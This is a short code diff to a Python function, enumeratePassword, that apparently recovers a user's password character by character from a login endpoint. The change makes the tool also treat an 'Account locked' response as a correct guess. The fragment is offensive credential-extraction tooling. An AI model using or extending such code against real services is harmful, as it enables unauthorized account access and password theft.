@@ -38,7 +38,7 @@ def enumeratePassword(url, session, username, progress_bar):
                 log.error(f"Request error: {e}")
                 continue
             
-            if request.status_code == 302:
+            if request.status_code == 302 or "Account locked: please reset your password" in request.text:
                 password += character
                 character_found = True
                 break
